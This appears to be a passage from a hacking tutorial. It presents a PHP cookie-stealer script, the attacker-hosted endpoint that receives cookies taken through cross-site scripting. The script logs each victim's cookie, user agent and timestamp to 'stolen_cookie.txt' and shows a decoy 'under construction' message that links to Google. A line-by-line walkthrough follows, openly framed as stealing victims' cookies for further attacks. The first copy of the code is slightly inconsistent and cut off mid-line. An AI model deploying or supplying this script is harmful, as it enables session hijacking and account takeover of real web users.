<?php
$collectedCookie=$HTTP_GET_VARS["cookie"];
$date=date("l ds of F Y h:i:s A");
$user_agent=$_SERVER['HTTP_USER_AGENT'];
$file=fopen('stolen_cookie.txt','a');
fwrite($file,"DATE:$date || USER AGENT:$user_agent || COOKIE:$cookie \n");
fclose($file);
echo '<b>Sorry , this page is under construction</b></br></br>Please Click<a

?>

So lets understand what the script will do :
$collectedCookie=$HTTP_GET_VARS["cookie"];
in this line we will store the data that is stored in a get variable called cookie then
store it in avariable called collectedCookie
$date=date("l ds of F Y h:i:s A");
here we store the date of the connection Occurs , it tells us when these cookies have been
stolen.

$user_agent=$_SERVER['HTTP_USER_AGENT'];
here we store the user_agent of the victim for further attacks if it needs to.
$file=fopen('stolen_cookie.txt','a');
here we create a file called stolen_cookie.txt that has victim's cookie information
fwrite($file,"DATE:$date || USER AGENT:$user_agent || COOKIE:$collectedCookie \n");
here we save the data as this format (“DATE: || USER AGENT || COOKIE”)
fclose($file);
her we close the file handle
echo '<b>Sorry , this page is under construction</b></br></br>Please Click<a
href="http://www.google.com/">here</a> to go back to previous page ';
here we print message on the screen (“Sorry , this page is under construction”)
and give him a link to click on it that send it to google.
Here we have finished the first filecthat will collect the cookie information
